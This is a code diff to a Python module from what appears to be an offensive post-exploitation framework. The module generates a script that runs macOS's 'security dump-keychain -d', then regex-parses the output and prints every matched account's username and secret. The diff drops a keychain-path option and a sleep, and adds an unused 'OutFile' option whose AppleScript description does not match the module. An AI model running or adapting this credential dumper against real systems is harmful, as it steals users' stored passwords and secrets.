@@ -49,10 +49,10 @@ class Module:
                 'Required'      :   True,
                 'Value'         :   ''
             },
-            'KeyChain' : {
-                'Description'   :   'Manual location of keychain to decrypt, otherwise default.',
-                'Required'      :   False,
-                'Value'         :   'login.keychain-db'
+            'OutFile' : {
+                'Description': 'File to output AppleScript to, otherwise displayed on the screen.',
+                'Required': False,
+                'Value': ''
             }
         }
 
@@ -73,20 +73,12 @@ class Module:
 
     def generate(self, obfuscate=False, obfuscationCommand=""):
 
-        keyChain = self.options['KeyChain']['Value']
-
         script = r"""
 import subprocess
 import re
-import time
 
-args = ['dump-keychain', '-d', '%s']
-process = subprocess.Popen(executable='/usr/bin/security', args="dump-keychain", stdout=subprocess.PIPE, shell=True)
-print "sleeping"
-time.sleep(10)
-print "slept"
+process = subprocess.Popen('/usr/bin/security dump-keychain -d', stdout=subprocess.PIPE, shell=True)
 keychain = process.communicate()
-print keychain
 find_account = re.compile('0x00000007\s\<blob\>\=\"([^\"]+)\"\n.*\n.*\"acct\"\<blob\>\=\"([^\"]+)\"\n.*\n.*\n.*\n\s+\"desc\"\<blob\>\=([^\n]+)\n.*\n.*\n.*\n.*\n.*\n.*\n.*\n.*\n.*\ndata\:\n([^\n]+)')
 accounts = find_account.findall(keychain[0])
 for account in accounts:
@@ -95,6 +87,6 @@ for account in accounts:
     print("Username: " + account[1])
     print("Secret: " + account[3])
 
-""" % (keyChain)
+"""
         print script
         return script
